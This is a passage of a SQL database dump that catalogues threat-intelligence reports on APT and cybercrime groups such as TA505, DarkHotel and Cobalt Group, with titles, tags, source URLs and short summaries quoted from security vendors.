cyber-crime gang that has been active since at least 2016. The group is mainly interested in carrying out attacks against banks, in an attempt to access the banks’ internal networks and potentially take over sensitive components, such as ATM-controlling servers or card-processing systems. Although the Europol arrested Cobalt Group’s leader in 2018, the group remains active until this day.','2019-08-02 12:18:31','2019-08-02 17:18:31','5d44307215e7f548f4375a4b'),(652,176,'Dark Caracal malware linked to Lebanon',NULL,'https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf',NULL,'The threat, called Dark Caracal by EFF and Lookout researchers, may be a nation-state actor and appears to employ shared infrastructure which has been linked to other nation-state actors. In a new report, EFF and Lookout trace Dark Caracal to a building belonging to the Lebanese General Security Directorate in Beirut.','2018-01-18 13:24:30','2018-01-18 18:24:30','5a60e60c0e543776b12bc973'),(653,119,'Signed Bandook Trojan Used in Worldwide Targeted Attacks','Bandook','https://research.checkpoint.com/2020/bandook-signed-delivered/',NULL,'Bandook, which had almost disappeared from the threat landscape, was featured in 2015 and 2017 campaigns, dubbed “Operation Manul” and “Dark Caracal“, respectively. These campaigns were presumed to be carried out by the Kazakh and the Lebanese governments, as uncovered by the Electronic Frontier Foundation (EFF) and Lookout.\n\nDuring this past year, dozens of digitally signed variants of this once commodity malware started to reappear in the threat landscape, reigniting interest in this old malware family.\n\nIn the latest wave of attacks, we once again identified an unusually large variety of targeted sectors and locations. This further reinforces a previous hypothesis that the malware is not developed in-house and used by a single entity, but is part of an offensive infrastructure sold by a third party to governments and threat actors worldwide, to facilitate offensive cyber operations.','2020-12-01 15:32:03','2020-12-01 20:32:03','5fc6a8431725dbaccdb8b860'),(654,75,'Magecart Group 4: A link with Cobalt Group?','Client-side skimming, Server-side skimming\n','https://blog.malwarebytes.com/threat-analysis/2019/10/magecart-group-4-a-link-with-cobalt-group/\n','','In the Inside Magecart report, Group 4 is described as advanced and uses techniques to blend in with normal traffic. For instance, Magecart will register domain names that appear to be tied to advertisers or analytic providers (see IOCs for Cobalt Group domains identified using this TTP and naming convention). Another interesting aspect from the report is that Group 4 is suspected to have had a history in banking malware.\n','2021-07-04 18:29:24','2021-07-07 11:09:06',NULL),(655,59,'Red October” Diplomatic Cyber Attacks Investigation','CVE-2009-3129, CVE-2010-3333, CVE-2012-0158, CVE-2011-3544\n','https://securelist.com/red-october-diplomatic-cyber-attacks-investigation/36740/#8\n','','In October 2012, Kaspersky Lab’s Global Research & Analysis Team initiated a new threat research after a series of attacks against computer networks of various international diplomatic service agencies. A large scale cyber-espionage network was revealed and analyzed during the investigation, which we called “Red October” (after famous novel “The Hunt For The Red October\n','2021-07-06 08:38:33','2021-07-07 10:50:22',NULL),(656,15,'icos duplication',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(657,13,'Inception Attackers Target Europe with Year-old Office Vulnerability','POWERSHOWER,  CVE-2012-1856,  CVE-2017-11882\n','https://unit42.paloaltonetworks.com/unit42-inception-attackers-target-europe-year-old-office-vulnerability/\n','','The Inception attackers have been active since at least 2014 and have been documented previously by both Blue Coat and Symantec; historical attacks used custom malware for a variety of platforms, and targeting a range of industries,  primarily in Russia, but also around the world. This blog describes attacks against European targets observed in October 2018, using CVE-2017-11882 and a new PowerShell backdoor we’re calling POWERSHOWER due to the attention to detail in terms of cleaning up after itself, along with the malware being written in PowerShell.\n','2021-07-07 10:52:41','2021-07-07 10:52:41',NULL),(659,8,'Cloud Atlas: RedOctober APT is back in style','','https://securelist.com/cloud-atlas-redoctober-apt-is-back-in-style/68083/\n','','\"Two years ago, Kaspersky published our research into RedOctober, a complex cyber-espionage operation targeting diplomatic embassies worldwide. Kaspersky named it RedOctober because Kapsersky started this investigation in October 2012, an unusually hot month.\n\nAfter Kaspersky announcement in January 2013, the RedOctober operation was promptly shut down and the network of C&Cs was dismantled. As usually happens with these big operations, considering the huge investment and number of resources behind it, they don’t just “go away” forever. Normally, the group goes underground for a few months, redesigns the tools and the malware and resume operations.\"\n','2021-07-07 10:56:25','2021-07-07 10:56:25',NULL),(660,82,'New Techniques to Uncover and Attribute Cobalt Gang Commodity Builders and Infrastructure Revealed','CVE-2017-0199,  ThreadKit builder, CMSTP, Regsvr32\n','https://unit42.paloaltonetworks.com/unit42-new-techniques-uncover-attribute-cobalt-gang-commodity-builders-infrastructure-revealed/\n','','Nowadays, it’s very easy for an advanced attacker to use commodity tools and malware along with very simple initial delivery methods to keep a low profile and stay away from possible attribution. One of the most common approaches is the use of spear phishing emails employing social engineering or commonly used exploits (such as CVE-2017-0199 or the ThreadKit builder) to trick the employees of organizations of interest. Once the initial infection has occurred is when the attacker becomes more sophisticated, deploying advanced custom pieces of malware, more advanced tools, and/or using living-off-the land tools (such as the use of PowerShell, or tools like CMSTP or Regsvr32).\n','2021-07-07 11:10:19','2021-07-07 11:10:19',NULL),(661,4,'Gaffe Reveals Full List of Targets in Spear Phishing Attack Using Cobalt Strike Against Financial Institutions','CVE-2017-11882\n','https://www.riskiq.com/blog/labs/cobalt-strike/\n','','\"In a recent spear-phishing campaign, the Cobalt Hacking Group used a remote code execution vulnerability in Microsoft Office software to connect to its command and control server via Cobalt Strike. However, they gave up much more information than they intended.\n\nOn Tuesday, November 21, a massive spear-phishing campaign began targeting individual employees at various financial institutions, mostly in Russia and Turkey. Purporting to provide info on changes to ‘SWIFT’ terms, the email contained a single attachment with no text in the body. It was an attempt by the Cobalt Group to gain a foothold in the networks of the targeted individuals\' organizations\"\n','2021-07-07 11:12:51','2021-07-07 11:12:51',NULL),(662,76,'Confucius APT Android Spyware Linked to India-Pakistan Conflict','SunBird,Hornbill','https://blog.lookout.com/lookout-discovers-novel-confucius-apt-android-spyware-linked-to-india-pakistan-conflict',NULL,'Two novel Android surveillanceware used by the Confucius state-sponsored threat group have been discovered by researchers in India and Pakistan, who say they are targeting people linked to the Indian-Pakistan conflict.','2021-07-07 11:18:18','2021-02-11 20:37:14','6025716ad1074318fbe5b3c8'),(663,9,'Silence group targeting Russian Banks via Malicious CHM',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(664,65,'Silence 2.0 Going Global',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(665,43,'Operation Wocao','XServer','https://resources.fox-it.com/rs/170-CAK-271/images/201912_Report_Operation_Wocao.pdf,https://github.com/fox-it/operation-wocao',NULL,'Operation Wocao  is the name that\nFox-IT uses to describe the hacking activities of a Chinese based hacking group.\nThis report details the profile of a publicly underreported threat actor that Fox-IT\nhas dealt with over the past two years. Fox-IT assesses with high confidence\nthat the actor is a Chinese group and that they are likely working to support the\ninterests of the Chinese government and are tasked with obtaining information\nfor espionage purposes. With medium confidence, Fox-IT assesses that the tools,\ntechniques and procedures are those of the actor referred to within the industry\nas APT20.','2021-07-07 19:01:29','2019-12-19 20:42:19','5dfb47cc8c55f41d5c2fd24f'),(666,1,'Tracking Cobalt Strike: A Trend Micro Vision One Investigation','Bloodhound, ADfind.exe, Mobsync.exe, excel.exe, rundll32.exe ','','','In late May, Trend Micro Managed XDR alerted a customer to a noteworthy Vision One alert on one of their endpoints. What followed was a deeper investigation that involved searching for other similarly infected endpoints and the confirmation of a Cobalt Strike detection.\n\nThis blog will cover the tactics and steps we took during this investigation. The alert from one endpoint led to the collection of further evidence and clues that pointed to other infected endpoints, eventually revealing the root of the attack.\n\nCobalt Strike is a well-known beacon or post-exploitation tool that has been linked to ransomware families like Ryuk, DoppelPaymer, and Povlsomware. The Cobalt Strike variant used here follows its typical characteristics. However, this report focuses on the process of uncovering its tracks in order to fully contain and remove the malware.','2021-07-10 10:16:35','2021-07-10 10:16:35',NULL),(667,7,'Cyberattack targeted Japan nuclear lab',NULL,'https://www.u-toyama.ac.jp/news/2016/doc/1011.pdf,http://news.asiaone.com/news/asia/cyberattacks-targeted-japans-nuclear-lab',NULL,'An internal investigation by the University of Toyama and other sources has revealed that a research centre at the university known for its work on tritium, a substance used to fuel nuclear fusion reactors, is feared to have been targeted by cyberattacks over a period of about six months.\n\nThe possibility of cyberattacks was discovered in June this year, and there are fears that information may have been stolen from the computer terminal of a researcher at the university&#39;s Hydrogen Isotope Research Center.','2021-08-02 08:34:27','2016-10-14 17:17:56','5800f8e08fe09108fbceebf3'),(668,78,'Asruex: Malware Infecting through Shortcut Files',NULL,'http://blog.jpcert.or.jp/2016/06/asruex-malware-infecting-through-shortcut-files.html',NULL,'JPCERT/CC has been observing malicious shortcut files that are sent as email attachments to a limited range of organisations since around October 2015. When this shortcut file is opened, the host will be infected with malware called “Asruex”. The malware has a remote controlling function, and attackers sending these emails seem to attempt intruding into the targets’ network using the malware. According to a blog article by Microsoft, the malware is associated with an attacker group identified as “DarkHotel” (Microsoft calls it as &quot;Dubnium&quot;) [1]. This blog entry will introduce the details of Asruex.','2021-08-02 08:34:27','2017-07-24 09:46:59','580114e18fe0910bc3ceec45'),(669,37,'BAIJIU: New Malware Abuses Popular Japanese Web Hosting Service',NULL,'https://www.cylance.com/en_us/blog/baijiu.html',NULL,'BAIJIU’s goal in this attack was to deploy a set of espionage tools through a downloader we call TYPHOON and a set of backdoors we call LIONROCK.\n\nThree distinctive elements of BAIJIU drew and held our attention: the unusual complexity of the attack; the appropriation of web hosting service GeoCities (of 1990s fame); and the use of multiple methods of obfuscation.','2021-08-02 08:34:27','2017-07-22 10:27:11','591647914da2580eb4eaf2f6'),(670,76,'Continued DarkHotel Activity',NULL,'https://ti.360.net/blog/articles/analysis-of-darkhotel/,https://s.tencent.com/research/report/465.html',NULL,'','2021-08-02 08:34:27','2019-07-15 09:46:30','5af1986295fff966763116ae'),(671,20,'Analysis of the CVE-2018-8373 0day vulnerability attack related to the Darkhotel gang',NULL,'https://ti.360.net/blog/articles/analyzing-attack-of-cve-2018-8373-and-darkhotel/',NULL,'On August 15, 2018, cybersecurity company Trend Micro disclosed an in-the-day 0day vulnerability attack that it captured in July this year. The attack exploited the code execution vulnerability of Windows VBScript Engine. After analysis and comparison, the 0day vulnerability and 2018 were discovered. In April, the 360 ​​company first discovered the &quot;double kill&quot; vulnerability that affects IE browser and attacks through Office documents (see [1] for details). It uses multiple identical attack technologies, most likely the same gang.','2021-08-02 08:34:27','2018-08-17 08:20:02','5b76853266cdab201fd9cd21'),(672,22,'Continued Activity by DarkHotel',NULL,'https://blogs.jpcert.or.jp/ja/2019/05/darkhotel_lnk.html',NULL,'','2021-08-02 08:34:27','2019-05-29 15:06:38','5cee9ffe72473a4c259773b7'),(673,37,'DarkHotel disclosed the latest attack on Chinese foreign trade',NULL,'https://s.tencent.com/research/report/741.html,https://twitter.com/blackorbird/status/1178491520518770688',NULL,'In April 2018, Tencent Yushen Threat Intelligence Center disclosed the targeted attack of \"DarkHotel\" against Chinese foreign trade executives in 2018. Recently, we have again detected the latest attack activities of the attack organization, and are still targeting attacks by foreign trade executives related to the Peninsula region.','2021-08-02 08:34:27','2019-09-30 08:17:03','5d10b5ff9097db58f873efd1'),(674,11,'Chrome 0-day exploit CVE-2019-13720 used in Operation WizardOpium',NULL,'https://securelist.com/chrome-0-day-exploit-cve-2019-13720-used-in-operation-wizardopium/94866/',NULL,'Kaspersky Exploit Prevention is a component part of Kaspersky products that has successfully detected a number of zero-day attacks in the past. Recently, it caught a new unknown exploit for Google’s Chrome browser. We promptly reported this to the Google Chrome security team. After reviewing of the PoC we provided, Google confirmed there was a zero-day vulnerability and assigned it CVE-2019-13720. Google has released Chrome version 78.0.3904.87 for Windows, Mac, and Linux and we recommend all Chrome users to update to this latest version as soon as possible! You can read Google’s bulletin by clicking here.','2021-08-02 08:34:27','2019-11-01 16:32:19','5dbc5ca2e4310e29af9612e3'),(675,42,'Ramsay: Espionage toolkit tailored for air gapped networks','Ramsay','https://www.welivesecurity.com/2020/05/13/ramsay-cyberespionage-toolkit-airgapped-networks/',NULL,'ESET researchers uncover several instances of malware that uses various attack vectors to target systems isolated by an air gap.','2021-08-02 08:34:27','2020-05-13 14:57:46','5ebc0aea704ae02e27e8eeeb'),(676,44,'Patchwork Continues to Deliver BADNEWS to the Indian Subcontinent','Dead Drop Resolvers,  CVE-2015-2545, CVE-2017-0261\n','https://unit42.paloaltonetworks.com/unit42-patchwork-continues-deliver-badnews-indian-subcontinent/, https://otx.alienvault.com/pulse/5f451bcc6cb8f690a24b8dde\n','','The malicious documents seen in recent activity refer to a number of topics, including recent military promotions within the Pakistan Army, information related to the Pakistan Atomic Energy Commission, as well as Pakistan’s Ministry of the Interior.\n','2021-08-02 16:11:39','2021-08-02 16:11:39',NULL),(677,47,'Cyber ​​Warfare in the Shadow of the India-Pakistan War','','https://www.youtube.com/watch?v=ahqDhT146Bc&list=RDMMp5ABMBesj38&index=12&ab_channel=TomWalkerVEVO, https://mp.weixin.qq.com/s/pJ-rnzB7VMZ0feM2X0ZrHA\n','','India and Pakistan belong to two countries in South Asia. However, due to some historical reasons, relations between the two countries have not been harmonious and conflicts have continued.\n','2021-08-02 16:15:36','2021-08-02 16:15:36',NULL),(678,5,'New PatchWork Spearphishing Attack','','https://otx.alienvault.com/pulse/5db02dabda2ce6c1949316fe/, https://lab52.io/blog/new-patchwork-campaign-against-pakistan/\n','','Recently, a somewhat more elaborated phishing has caught our attention at Lab52, it consists on a malicious office document of a real article from Samaa.tv published on 07-10-2019, one of the most important media in Pakistan. The article used in this campaign is related to the current rise of tension in the geopolitical Indian-Pakistani conflict with Kashmir. The headline of the article is: “India to become center of extremism under Modi: AJK PM” ([1]).\n','2021-08-02 16:30:14','2021-08-02 16:30:14',NULL),(679,27,'Patchwork APT Group Targets US Think Tanks','Spear Phishing, QuasarRAT\n','https://www.volexity.com/blog/2018/06/07/patchwork-apt-group-targets-us-think-tanks/\n','','The malicious documents seen in recent activity refer to a number of topics, including recent military promotions within the Pakistan Army, information related to the Pakistan Atomic Energy Commission, as well as Pakistan’s Ministry of the Interior.\n','2021-08-02 16:33:33','2021-08-02 16:33:33',NULL),(680,38,'Leaked source code for Ammyy Admin turned into FlawedAmmyy RAT',NULL,'https://www.proofpoint.com/us/threat-insight/post/leaked-source-code-ammyy-admin-turned-flawedammyy-rat',NULL,'Proofpoint researchers have discovered a previously undocumented remote access Trojan (RAT) called FlawedAmmyy that has been used since the beginning of 2016 in both highly targeted email attacks as well as massive, multi-million message campaigns. Narrow attacks targeted the Automotive industry among others, while the large malicious spam campaigns appear to be associated with threat actor TA505, an actor responsible for many large-scale attacks since at least 2014.','2021-08-02 16:57:45','2019-04-03 13:54:44','5aa6aaa1073c600e0c6aaf90'),(681,37,'ServHelper and FlawedGrace - New malware introduced by TA505',NULL,'https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505,https://twitter.com/James_inthe_box/status/1063079744118259713,https://twitter.com/James_inthe_box/status/1077993975758245888,https://iris-h.services/#/pages/report/79533c7ada57a74efa95206e3ddd2aafd3329897',NULL,'For much of 2018, we observed threat actors increasingly distributing downloaders, backdoors, information stealers, remote access Trojans (RATs), and more as they abandoned ransomware as their primary payload. In November 2018, TA505, a prolific actor that has been at the forefront of this trend, began distributing  a new backdoor we named ServHelper.','2021-08-02 16:57:45','2019-04-12 20:17:34','5c370f1402883d5f3f2ff3fa'),(682,32,'Excel Macro Used by TA505 to Target Financial Institutions',NULL,'https://ti.360.net/blog/articles/excel-4.0-macro-utilized-by-ta505-to-target-financial-institutions-recently-en/,http://blog.inquest.net/blog/2019/01/29/Carving-Sneaky-XLM-Files/',NULL,'Last month, 360 Threat Intelligence Center captured multiple phishing emails sent by the TA505 Group to financial institutions. These phishing emails contain Excel attachments with Excel 4.0 Macros embedded to download a backdoor.','2021-08-02 16:57:45','2019-02-25 16:11:39','5c49af3655401d51441fbf60'),(683,9,'Threat Actor TA505 Targets Financial Enterprises Using LOLBINS and a new backdoor malware',NULL,'https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware',NULL,'In this research, Cybereason introduce a meticulously planned, malicious operation against a financial institution in April of 2019. This advanced operation combines a targeted phishing attack with advanced tools that gather intel on the environment. The operation chooses whether or not to create persistence and installs a sophisticated backdoor called ServHelper used to take over the network.','2021-08-02 16:57:45','2019-04-25 14:23:18','5cc1c2d6c6f2fc4f4ee671be'),(684,10,'TA505 is Expanding its Operations',NULL,'https://blog.yoroi.company/research/ta505-is-expanding-its-operations/',NULL,'Crimeware attacks against finance and retail.','2021-08-02 16:57:45','2019-05-29 10:34:56','5cee6050274fab0b9b0dea99'),(685,222,'Breaking Down TA505 Groups Use of HTML and RATs',NULL,'https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/',NULL,'TA505 is a prolific cybercriminal group known for its attacks against multiple financial institutions and retail companies using malicious spam campaigns and different malware. We have been following TA505 closely and detected various related activities for the past two months. In the group’s latest campaign, they started using HTML attachments to deliver malicious .XLS files that lead to downloader and backdoor FlawedAmmyy, mostly to target users in South Korea.','2021-08-02 16:57:45','2019-06-12 13:07:46','5d00f923684ce2bac6dd094c'),(686,17,'TA505 begins summer campaigns with a new pet malware downloader, AndroMut',NULL,'https://www.proofpoint.com/us/threat-insight/post/ta505-begins-summer-campaigns-new-pet-malware-downloader-andromut-uae-south',NULL,'Throughout 2018, Proofpoint researchers observed threat actors increasingly distributing downloaders, backdoors, information stealers, remote access trojans (RATs), and more as they abandoned ransomware as their primary payload. In November 2018, TA505, a prolific actor that has been at the forefront of this trend, began distributing a new backdoor we named “ServHelper”. ServHelper has two variants: one focused on remote desktop functions and a second that primarily functioned as a downloader.\n\nIn June 2019, TA505 appears to have introduced yet another new downloader malware, AndroMut, which has some similarities in code and behavior to Andromeda, a long-established malware family. Proofpoint research has observed AndroMut download malware referred to as “FlawedAmmyy.” FlawedAmmyy is a full-featured RAT that was first observed in early 2016 and is based on the leaked source code of a legitimate shareware tool, Ammyy.','2021-08-02 16:57:45','2019-07-03 14:25:21','5d1cbad17fdaa2b1187577b5'),(687,22,'TA505 using new malware Gelup and Flowerpipi',NULL,'https://documents.trendmicro.com/assets/Tech-Brief-Latest-Spam-Campaigns-from-TA505-Now-Using-New-Malware-Tools-Gelup-and-FlowerPippi.pdf',NULL,'TA505 using new malware Gelup and Flowerpipi. Obtaining samples and infrastructure.','2021-08-02 16:57:45','2019-07-05 10:00:36','5d1e22a82ecd4fa614684a6e'),(688,215,'TA505 Targets Retailers',NULL,'https://www.cyberint.com/wp-content/uploads/2019/06/CyberInt_Legit-Remote-Access-Tools-Turn-Into-Threat-Actors-Tools_Report.pdf',NULL,'','2021-08-02 16:57:45','2019-09-05 13:51:54','5d7112fa67119654e03cffe8'),(689,327,'Multiple TA505 campaigns',NULL,NULL,NULL,'Multiple TA505 campaigns','2021-08-02 16:57:45','2020-03-25 17:54:54','5d78dc8a0006495d5fb9296e'),(690,24,'TA505 Distributes New SDBbot Remote Access Trojan with Get2 Downloader','Backdoor:Win32/FlawedAmmyy','https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader',NULL,'In September 2019, Proofpoint researchers observed a prolific threat actor, TA505, sending email campaigns that attempt to deliver and install Get2, a new downloader. Get2 was, in turn, observed downloading FlawedGrace, FlawedAmmyy, Snatch, and SDBbot (a new RAT) as secondary payloads.','2021-08-02 16:57:48','2019-10-18 16:06:55','5da719a5ca8d0afb2368f4ef'),(691,67,'Active TA505 Campaigns',NULL,'https://mp.weixin.qq.com/s/ujeIeb_BWoLWu420imwAOQ',NULL,'','2021-08-02 16:57:48','2019-11-26 04:42:07','5dad976536418494e8540014'),(692,83,'TA505 evolves ServHelper, uses Predator The Thief and Team Viewer Hijacking','ServHelper','https://www.blueliv.com/cyber-security-and-cyber-threat-intelligence-blog-blueliv/research/servhelper-evolution-and-new-ta505-campaigns/',NULL,'ServHelper is a backdoor first spotted at the end of 2018 by Proofpoint and linked to TA505. This threat actor is known to have distributed Dridex and Locky in the past, in addition to FlawedAmmyy, FlawedGrace and Get2/SDBBot more recently, amongst others.','2021-08-02 16:57:48','2020-01-23 15:07:04','5dfcfffe67cf6fca9b9c290c'),(693,8,'TA505 COVID-19 Phishing Lures','Win.Dropper.Hideproc,Trojan.Win32.Inject,Xls.Dropper.Agent','https://twitter.com/reecdeep/status/1237377821787541504,https://twitter.com/JAMESWT_MHT/status/1237381890392223744,https://twitter.com/Bl4ng3l/status/1237378745574592512,https://www.proofpoint.com/us/threat-insight/post/ta505-and-others-launch-new-coronavirus-campaigns-now-largest-collection-attack',NULL,'TA505 leverages the COVID-19 crisis for phishing campaigns using XLS spreadsheets with filenames \"EMR Letter.xls\" and \"COVID-19-FAQ.xls\"','2021-08-02 16:57:48','2020-04-24 16:03:10','5ea06a3ce9030e041b86dbb5'),(694,134,'TA505 June 2020 Campaign',NULL,'https://twitter.com/AdamTheAnalyst/status/1268107667073110017',NULL,'After a few months of inactivity, it looks like TA505 is back. New campaign targeting german users.','2021-08-02 16:57:48','2020-07-07 17:21:19','5ed6792bbc276d41051ed969'),(695,22,'ServHelper: Hidden Miners',NULL,'https://www.gdatasoftware.com/blog/2020/07/36122-hidden-miners',NULL,'\"First seen during Q3 of 2018, a backdoor named ServHelper that is associated with the hacking group TA505 has been seen targeting financial and retail sectors. With the help of this backdoor, it enabled them to install and deploy other malware like Information Stealers (Predator Stealer), and Remote Access Trojans (RAT) (FlawedAmmy, NetSupport). And in January 2020, we have encountered a new variant that is readily capable of installing a CryptoMiner bundled with it. This Miner is hidden inside the infected system through a spawned virtualized environment.\"','2021-08-02 16:57:51','2020-07-14 20:20:37','5f0e11325ceed6cb0ef53fea'),(696,63,'TA505 August/September 2020 Campaign',NULL,NULL,NULL,'After a few weeks of inactivity, it looks like TA505 is back.','2021-08-02 16:57:51','2020-09-21 19:58:17','5f2af3438e6633b8cd59afac'),(697,20,'Eager Beaver: A Short Overview of the Restless Threat Actor TA505','Get2,SDBot,Backdoor:Win32/SdBot,Trojan:Win32/Sdbot','https://www.telekom.com/en/blog/group/article/eager-beaver-a-short-overview-of-the-restless-threat-actor-ta505-609546',NULL,'TA505 is a very active – almost tireless - threat actor that prepares one campaign after another from Monday to Friday. They target organizations across industries / government in many countries around the world including Canada, Germany, South Korea, the UK, and the USA. A severe threat to a great number of organizations: on one side, they conduct Big Game Hunting operations, that is encrypting large parts of a corporate network to extort high ransom payouts. On the other side, they likely work on initial access development and hand over network access to associated threat actors. \n\nIn this blog post, I will summarize what I know about TA505 as of September 2020, leaving the past aside.','2021-08-02 16:57:53','2020-10-06 18:34:44','5f7cb8c475a06cfa830a87c4'),(698,20,'Using Qiling Framework to Unpack TA505 packed samples','Azorult - S0344,Silence,Win.Trojan.Silence,Trojan-Banker.Silence,Trojan:Win32/TrueBot,Gelup,AndroMut,TinyMet,Trojan:Win32/Tinymet,FlawedAmmyy - S0381','https://www.blueliv.com/cyber-security-and-cyber-threat-intelligence-blog-blueliv/using-qiling-framework-to-unpack-ta505-packed-samples/,https://github.com/Blueliv/unpack-ta505packer-qiling',NULL,'Threat Actors make use of packers when distributing their malware as they remain an effective way to evade detection and to make them more difficult to analyze.  In this blogpost, Blueliv shows how to unpack TA505 packed samples using the Qiling Framework emulator version 1.2, which will allow us to do so, without needing to study and replicate all the implementation details of the unpacking algorithm.','2021-08-02 16:57:53','2020-12-14 20:19:11','5fd7c83b5b8c5225e9c01587'),(699,21,'The Return of the MINEBRIDGE RAT with New TTPs and Social Engineering Lures','MINEBRIDGE,Win32.Backdoor.MINEBRIDGE,VBA.Downloader.MINEBRIDGE,Trojan-Spy.Win32.Gazvas','https://www.zscaler.com/blogs/security-research/return-minebridge-rat-new-ttps-and-social-engineering-lures',NULL,'Zscaler ThreatLabZ has recently observed a few changes in the tactics, techniques, and procedures (TTPs) of the threat actor behind the MINEBRIDGE RAT since it was last observed in March 2020. In this blog, Zscaler ThreatLabZ provides insight into the changes in TTPs, threat attribution, command-and-control (C&C)  infrastructure, and a technical analysis of the attack flow.','2021-08-02 16:57:53','2021-02-24 20:20:54','6036b5265ae36030329f4ad9'),(700,21,'MineBridge Is on the Rise, with a Sophisticated Delivery Mechanism','MineBridge RAT,NetSupportManager RAT,TeamViewer','https://blog.morphisec.com/minebridge-on-the-rise-sophisticated-delivery-mechanism',NULL,'The MineBridge RAT, which FireEye identified in January 2020, was initially classified as a C++ RAT. The updated RAT began using a macro embedded in Word document in late February. In this blog post Morphisec covers a new delivery chain for the MineBridge RAT, including technical details and indicators.','2021-08-02 16:57:53','2021-03-10 16:03:29','6048edd2878a0c08ab80b406'),(701,86,'Threat Assessment: Clop Ransomware','Clop Ransomware,Ransom:Win32/Clop,Ransom:Win64/ClopCrypt','https://unit42.paloaltonetworks.com/clop-ransomware/,https://github.com/pan-unit42/iocs/blob/master/clop-iocs.text',NULL,'Unit 42 researchers have observed an uptick in Clop ransomware activity affecting the wholesale and retail, transportation and logistics, education, manufacturing, engineering, automotive, energy, financial, aerospace, telecommunications, professional and legal services, healthcare and high tech industries in the U.S., Europe, Canada, Asia Pacific and Latin America. Due to the surge of this malicious activity, Unit 42 created this threat assessment for overall threat awareness.','2021-08-02 16:57:53','2021-04-13 20:54:00','607604e8e122ccfb03ab74a5'),(702,139,'The Curious Case of the Criminal Curriculum Vitae','','https://blog.prevailion.com/2020/03/the-curious-case-of-criminal-curriculum.html\n','trojanized version of a Curriculum Vitae\n','\"The Tailored Intelligence Team at Prevailion has detected a new campaign—at least a facet of which is currently active—dubbed The Curious Case of the Criminal Curriculum Vitae.\n\nIn this newly discovered campaign, threat actors targeted German companies with trojanized emails disguised as job applicants. While this activity appeared to be geographically based in Germany, these same techniques could easily be applied to any organization.\n\nOnce the email attachment was activated, a company\'s secure credentials and credit card data could be transmitted covertly to the threat actors. In the 2019 iterations of this attack, the attackers used commercial tools to encrypt all the users files, which suggests this recent activity could also lay the groundwork for an infection vector into the company\'s network to encrypt files.\"\n','2021-08-02 17:04:44','2021-08-02 17:04:44',NULL),(703,6,'TA505 Abusing SettingContent-ms within PDF files to Distribute FlawedAmmyy RAT','','https://www.proofpoint.com/us/threat-insight/post/ta505-abusing-settingcontent-ms-within-pdf-files-distribute-flawedammyy-rat\n','','\"Threat actors regularly introduce novel vectors for distributing malware and especially prize those that allow code and command execution with minimal user interaction. Colleagues at SpecterOps recently published research[1] on abuse of the SettingContent-ms file format. Crafted SettingContent-ms files can be used to bypass certain Windows 10 defenses such as Attack Surface Reduction (ASR) and detection of OLE-embedded dangerous file formats. Specifically, this file format currently allows execution of commands such as cmd.exe and PowerShell without prompts or user interaction.\n\nSince the original publication of this approach, Proofpoint researchers have observed a number of actors -- “early adopters” -- abusing this file format by embedding it inside Microsoft Word and PDF documents. While the combination of the technique with the Microsoft Word container was described in the initial research, embedding inside PDFs has not been documented and likely originated with another source.\"\n','2021-08-02 17:07:11','2021-08-02 17:07:11',NULL),(704,194,'TA505 begins summer campaigns with a new pet malware downloader, AndroMut, in the UAE, South Korea, Singapore, and the United States','AndroMut, FlawedAmmyy\n','https://www.proofpoint.com/us/threat-insight/post/ta505-begins-summer-campaigns-new-pet-malware-downloader-andromut-uae-south\n','','\"Throughout 2018, Proofpoint researchers observed threat actors increasingly distributing downloaders, backdoors, information stealers, remote access trojans (RATs), and more as they abandoned ransomware as their primary payload. In November 2018, TA505, a prolific actor that has been at the forefront of this trend, began distributing a new backdoor we named “ServHelper”. ServHelper has two variants: one focused on remote desktop functions and a second that primarily functioned as a downloader.\n\nIn June 2019, TA505 appears to have introduced yet another new downloader malware, AndroMut, which has some similarities in code and behavior to Andromeda, a long-established malware family. Proofpoint research has observed AndroMut download malware referred to as “FlawedAmmyy.” FlawedAmmyy is a full-featured RAT that was first observed in early 2016 and is based on the leaked source code of a legitimate shareware tool, Ammyy.\"\n','2021-08-02 17:12:56','2021-08-02 17:12:56',NULL),(705,23,'TA505 Continues to Infect Networks With SDBbot RAT','SDBbot remote-access Trojan, Spear phishing, Macro-enabled documents\n','https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/\n','','IBM X-Force Incident Response and Intelligence Services (IRIS) responds to security incidents around the globe. During analysis and comparison of malicious activity on enterprise networks, Research team identified attacks likely linked to Hive0065, also known as TA505. the team observed that Hive0065 continues to spread the SDBbot remote-access Trojan (RAT) alongside other custom malware and continues to display tactics used against companies within the past year\n','2021-08-02 17:16:47','2021-08-02 17:16:47',NULL),(706,163,'STOMP 2 DIS: Brilliance in the (Visual) Basics','MINEBRIDGE\n','https://www.fireeye.com/blog/threat-research/2020/01/stomp-2-dis-brilliance-in-the-visual-basics.html\n','','Throughout January 2020, FireEye has continued to observe multiple targeted phishing campaigns designed to download and deploy a backdoor we track as MINEBRIDGE. The campaigns primarily targeted financial services organizations in the United States, though targeting is likely more widespread than those we’ve initially observed in our FireEye product telemetry. At least one campaign targeted South Korean organizations, including a marketing agency.\n','2021-08-02 17:19:08','2021-08-02 17:19:08',NULL),(707,6,'Microsoft Detects New TA505 Malware Attacks After Short Break','RATs, Dridex, Trick banking Trojans , Locky,  BitPaymer, Philadelphia, GlobeImposter, Jaff ransomware\n','https://www.bleepingcomputer.com/news/security/microsoft-detects-new-ta505-malware-attacks-after-short-break/\n','','\"The new campaign uses HTML redirectors attached to emails. When opened, the HTML leads to the download a malicious macro-laden Excel file that drops the payload,\" Microsoft Security Intelligence\'s researchers explain. \"In contrast, past Dudear email campaigns carried the malware as an attachment or used malicious URLs.\"\n','2021-08-02 17:21:19','2021-08-02 17:21:19',NULL),(708,16,'The Stealthy Email Stealer in the TA505 Arsenal','','https://yoroi.company/research/the-stealthy-email-stealer-in-the-ta505-arsenal/\n','','Threat Intelligence surveillance team spotted increasing evidence of an operation intensification against the Banking sector. In fact, many independent researchers pointed to a particular email attack wave probably related 